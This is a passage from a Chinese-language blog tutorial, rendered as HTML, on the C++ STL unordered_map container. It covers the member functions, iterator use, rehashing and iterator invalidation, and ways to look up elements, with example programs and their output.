运算符，其功能是可以向访问数组中元素那样，只要给定某个键值对的键 key，就可以获取该键对应的值。注意，如果当前容器中没有以 key 为键的键值对，则其会使用该键向当前容器中插入一个新键值对。</td></tr><tr><td>at(key)</td><td>返回容器中存储的键 key 对应的值，如果 key 不存在，则会抛出 out_of_range 异常。</td></tr><tr><td>find(key)</td><td>查找以 key 为键的键值对，如果找到，则返回一个指向该键值对的正向迭代器；反之，则返回一个指向容器中最后一个键值对之后位置的迭代器（如果 end() 方法返回的迭代器）。</td></tr><tr><td>count(key)</td><td>在容器中查找以 key 键的键值对的个数。</td></tr><tr><td>equal_range(key)</td><td>返回一个 pair 对象，其包含 2 个迭代器，用于表明当前容器中键为 key 的键值对所在的范围。</td></tr><tr><td>emplace()</td><td>向容器中添加新键值对，效率比 insert() 方法高。</td></tr><tr><td>emplace_hint()</td><td>向容器中添加新键值对，效率比 insert() 方法高。</td></tr><tr><td>insert()</td><td>向容器中添加新键值对。</td></tr><tr><td>erase()</td><td>删除指定键值对。</td></tr><tr><td>clear()</td><td>清空容器，即删除容器中存储的所有键值对。</td></tr><tr><td>swap()</td><td>交换 2 个 unordered_map 容器存储的键值对，前提是必须保证这 2 个容器的类型完全相等。</td></tr><tr><td>bucket_count()</td><td>返回当前容器底层存储键值对时，使用桶（一个线性链表代表一个桶）的数量。</td></tr><tr><td>max_bucket_count()</td><td>返回当前系统中，unordered_map 容器底层最多可以使用多少桶。</td></tr><tr><td>bucket_size(n)</td><td>返回第 n 个桶中存储键值对的数量。</td></tr><tr><td>bucket(key)</td><td>返回以 key 为键的键值对所在桶的编号。</td></tr><tr><td>load_factor()</td><td>返回 unordered_map 容器中当前的负载因子。负载因子，指的是的当前容器中存储键值对的数量（size()）和使用桶数（bucket_count()）的比值，即 load_factor() = size() / bucket_count()。</td></tr><tr><td>max_load_factor()</td><td>返回或者设置当前 unordered_map 容器的负载因子。</td></tr><tr><td>rehash(n)</td><td>将当前容器底层使用桶的数量设置为 n。</td></tr><tr><td>reserve()</td><td>将存储桶的数量（也就是 bucket_count() 方法的返回值）设置为至少容纳count个元（不超过最大负载因子）所需的数量，并重新整理容器。</td></tr><tr><td>hash_function()</td><td>返回当前容器使用的哈希函数对象。</td></tr></tbody></table><p>注意的是，对于实现互换 2 个相同类型 unordered_map 容器的键值对，除了可以调用该容器模板类中提供的 swap() 成员方法外，STL 标准库还提供了同名的 swap() 非成员函数。</p><p>部分函数用法例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建空 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap;<br>    <span class="hljs-comment">//向 umap 容器添加新键值对</span><br>    umap.emplace(<span class="hljs-string">&quot;Python教程&quot;</span>, <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    umap.emplace(<span class="hljs-string">&quot;Java教程&quot;</span>, <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    umap.emplace(<span class="hljs-string">&quot;Linux教程&quot;</span>, <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    <span class="hljs-comment">//输出 umap 存储键值对的数量</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;umap size = &quot;</span> &lt;&lt; umap.size() &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//使用迭代器输出 umap 容器存储的所有键值对</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = umap.begin(); iter != umap.end(); ++iter) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>umap size = <span class="hljs-number">3</span><br>Python教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>Linux教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>Java教程 https:<span class="hljs-comment">//lichengloong.com/</span><br></code></pre></div></td></tr></table></figure><h5 id="1-3-unordered-map迭代器的用法"><a href="#1-3-unordered-map迭代器的用法" class="headerlink" title="1.3 unordered_map迭代器的用法"></a>1.3 unordered_map迭代器的用法</h5><p>C++ STL 标准库中，unordered_map 容器迭代器的类型为前向迭代器（又称正向迭代器）。这意味着，假设 p 是一个前向迭代器，则其只能进行 *p、p++、++p 操作，且 2 个前向迭代器之间只能用 == 和 != 运算符做比较。</p><p>unordered_map迭代器相关成员方法：</p><table><thead><tr><th>成员方法</th><th>功能</th></tr></thead><tbody><tr><td>begin()</td><td>返回指向容器中第一个键值对的正向迭代器。</td></tr><tr><td>end()</td><td>返回指向容器中最后一个键值对之后位置的正向迭代器。</td></tr><tr><td>cbegin()</td><td>和 begin() 功能相同，只不过在其基础上增加了 const 属性，即该方法返回的迭代器不能用于修改容器内存储的键值对。</td></tr><tr><td>cend()</td><td>和 end() 功能相同，只不过在其基础上，增加了 const 属性，即该方法返回的迭代器不能用于修改容器内存储的键值对。</td></tr><tr><td>find(key)</td><td>查找以 key 为键的键值对，如果找到，则返回一个指向该键值对的正向迭代器；反之，则返回一个指向容器中最后一个键值对之后位置的迭代器（如果 end() 方法返回的迭代器）。</td></tr><tr><td>equal_range(key)</td><td>返回一个 pair 对象，其包含 2 个迭代器，用于表明当前容器中键为 key 的键值对所在的范围。</td></tr></tbody></table><p>equal_range(key) 很少用于 unordered_map 容器，因为该容器中存储的都是键不相等的键值对，即便调用该成员方法，得到的 2 个迭代器所表示的范围中，最多只包含 1 个键值对。事实上，该成员方法更适用于 unordered_multimap 容器。</p><p>分成员方法的用法：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap&#123;<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125; &#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;umap 存储的键值对包括：&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//遍历输出 umap 容器中所有的键值对</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = umap.begin(); iter != umap.end(); ++iter) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;&lt;&quot;</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-string">&quot;&gt;&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-comment">//获取指向指定键值对的前向迭代器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;::iterator iter = umap.find(<span class="hljs-string">&quot;Java教程&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt;<span class="hljs-string">&quot;umap.find(\&quot;Java教程\&quot;) = &quot;</span> &lt;&lt; <span class="hljs-string">&quot;&lt;&quot;</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-string">&quot;&gt;&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>umap 存储的键值对包括：<br>&lt;Python教程, https:<span class="hljs-comment">//lichengloong.com/&gt;</span><br>&lt;Linux教程, https:<span class="hljs-comment">//lichengloong.com/&gt;</span><br>&lt;Java教程, https:<span class="hljs-comment">//lichengloong.com/&gt;</span><br>umap.find(<span class="hljs-string">&quot;Java教程&quot;</span>) = &lt;Java教程, https:<span class="hljs-comment">//lichengloong.com/&gt;</span><br></code></pre></div></td></tr></table></figure><p>需要注意的是，在操作 unordered_map 容器过程（尤其是向容器中添加新键值对）中，一旦当前容器的负载因子超过最大负载因子（默认值为 1.0），该容器就会适当增加桶的数量（通常是翻一倍），并自动执行 rehash() 成员方法，重新调整各个键值对的存储位置（此过程又称“重哈希”），此过程很可能导致之前创建的迭代器失效。</p><blockquote><p>所谓迭代器失效，针对的是那些用于表示容器内某个范围的迭代器，由于重哈希会重新调整每个键值对的存储位置，所以容器重哈希之后，之前表示特定范围的迭代器很可能无法再正确表示该范围。但是，重哈希并不会影响那些指向单个键值对元素的迭代器。</p></blockquote><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>&gt; umap;<br>    <span class="hljs-comment">//向 umap 容器添加 50 个键值对</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">50</span>; i++) &#123;<br>        umap.emplace(i, i);<br>    &#125;<br>    <span class="hljs-comment">//获取键为 49 的键值对所在的范围</span><br>    <span class="hljs-keyword">auto</span> <span class="hljs-built_in">pair</span> = umap.equal_range(<span class="hljs-number">49</span>);<br>    <span class="hljs-comment">//输出 pair 范围内的每个键值对的键的值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = <span class="hljs-built_in">pair</span>.first; iter != <span class="hljs-built_in">pair</span>.second; ++iter) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//手动调整最大负载因子数</span><br>    umap.max_load_factor(<span class="hljs-number">3.0</span>);<br>    <span class="hljs-comment">//手动调用 rehash() 函数重哈希</span><br>    umap.rehash(<span class="hljs-number">10</span>);<br>    <span class="hljs-comment">//重哈希之后，pair 的范围可能会发生变化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = <span class="hljs-built_in">pair</span>.first; iter != <span class="hljs-built_in">pair</span>.second; ++iter) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">49</span><br><span class="hljs-number">49</span> <span class="hljs-number">17</span><br></code></pre></div></td></tr></table></figure><p>通过输出结果不难发现，之前用于表示键为 49 的键值对所在范围的 2 个迭代器，重哈希之后表示的范围发生了改变。</p><p>用于遍历整个容器的 begin()/end() 和 cbegin()/cend() 迭代器对，重哈希只会影响遍历容器内键值对的顺序，整个遍历的操作仍然可以顺利完成。</p><h5 id="1-4-unordered-map获取元素的4种方法"><a href="#1-4-unordered-map获取元素的4种方法" class="headerlink" title="1.4 unordered_map获取元素的4种方法"></a>1.4 unordered_map获取元素的4种方法</h5><blockquote><p><strong>1) unordered_map 容器类模板中，实现了对 [ ] 运算符的重载，使得我们可以像“利用下标访问普通数组中元素”那样，通过目标键值对的键获取到该键对应的值。</strong></p></blockquote><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap&#123;<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/1&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/2&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/3&quot;</span>&#125; &#125;;<br>    <span class="hljs-comment">//获取 &quot;Java教程&quot; 对应的值</span><br>    <span class="hljs-built_in">string</span> str = umap[<span class="hljs-string">&quot;Java教程&quot;</span>];<br>    <span class="hljs-built_in">cout</span> &lt;&lt; str &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>https:<span class="hljs-comment">//lichengloong.com/2</span><br></code></pre></div></td></tr></table></figure><p>要注意的是，如果当前容器中并没有存储以 [ ] 运算符内指定的元素作为键的键值对，则此时 [ ] 运算符的功能将转变为：向当前容器中添加以目标元素为键的键值对。举个例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建空 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap;<br>    <span class="hljs-comment">//[] 运算符在 = 右侧</span><br>    <span class="hljs-built_in">string</span> str = umap[<span class="hljs-string">&quot;STL教程&quot;</span>];<br>    <span class="hljs-comment">//[] 运算符在 = 左侧</span><br>    umap[<span class="hljs-string">&quot;C教程&quot;</span>] = <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>;<br>   <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = umap.begin(); iter != umap.end(); ++iter) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>C教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>STL教程<br></code></pre></div></td></tr></table></figure><p>可以看见，当使用 [ ] 运算符向 unordered_map 容器中添加键值对时，分为 2 种情况：</p><blockquote><p>1.当 [ ] 运算符位于赋值号（=）右侧时，则新添加键值对的键为 [ ] 运算符内的元素，其值为键值对要求的值类型的默认值（string 类型默认值为空字符串）；<br>2.当 [ ] 运算符位于赋值号（=）左侧时，则新添加键值对的键为 [ ] 运算符内的元素，其值为赋值号右侧的元素。</p></blockquote><blockquote><p><strong>2) unordered_map 类模板中，还提供有 at() 成员方法，和使用 [ ] 运算符一样，at() 成员方法也需要根据指定的键，才能从容器中找到该键对应的值；</strong></p></blockquote><p>不同之处在于，如果在当前容器中查找失败，该方法不会向容器中添加新的键值对，而是直接抛出out_of_range异常。</p><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap&#123;<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/1&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/2&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/3&quot;</span>&#125; &#125;;<br>    <span class="hljs-comment">//获取指定键对应的值</span><br>    <span class="hljs-built_in">string</span> str = umap.at(<span class="hljs-string">&quot;Python教程&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; str &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//执行此语句会抛出 out_of_range 异常</span><br>    <span class="hljs-comment">//cout &lt;&lt; umap.at(&quot;GO教程&quot;);</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>https:<span class="hljs-comment">//lichengloong.com/1</span><br></code></pre></div></td></tr></table></figure><p>此程序中，第 12 行代码用于获取 umap 容器中键为“Python教程”对应的值，由于 umap 容器确实有符合条件的键值对，因此可以成功执行；而第 17 行代码，由于当前 umap 容器没有存储以“Go教程”为键的键值对，因此执行此语句会抛出 out_of_range 异常。</p><blockquote><p><strong>3) [ ] 运算符和 at() 成员方法基本能满足大多数场景的需要。除此之外，还可以借助 unordered_map 模板中提供的 find() 成员方法。</strong></p></blockquote><p>和前面方法不同的是，通过 find() 方法得到的是一个正向迭代器，该迭代器的指向分以下 2 种情况：</p><blockquote><p>1.当 find() 方法成功找到以指定元素作为键的键值对时，其返回的迭代器就指向该键值对；<br>2.当 find() 方法查找失败时，其返回的迭代器和 end() 方法返回的迭代器一样，指向容器中最后一个键值对之后的位置。</p></blockquote><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap&#123;<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125; &#125;;<br>    <span class="hljs-comment">//查找成功</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;::iterator iter = umap.find(<span class="hljs-string">&quot;Python教程&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//查找失败</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;::iterator iter2 = umap.find(<span class="hljs-string">&quot;GO教程&quot;</span>);<br>    <span class="hljs-keyword">if</span> (iter2 == umap.end()) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;当前容器中没有以\&quot;GO教程\&quot;为键的键值对&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>Python教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>当前容器中没有以<span class="hljs-string">&quot;GO教程&quot;</span>为键的键值对<br></code></pre></div></td></tr></table></figure><blockquote><p><strong>4) 除了 find() 成员方法之外，甚至可以借助 begin()/end() 或者 cbegin()/cend()，通过遍历整个容器中的键值对来找到目标键值对。</strong></p></blockquote><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap&#123;<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/1&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/2&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/3&quot;</span>&#125; &#125;;<br>    <span class="hljs-comment">//遍历整个容器中存储的键值对</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = 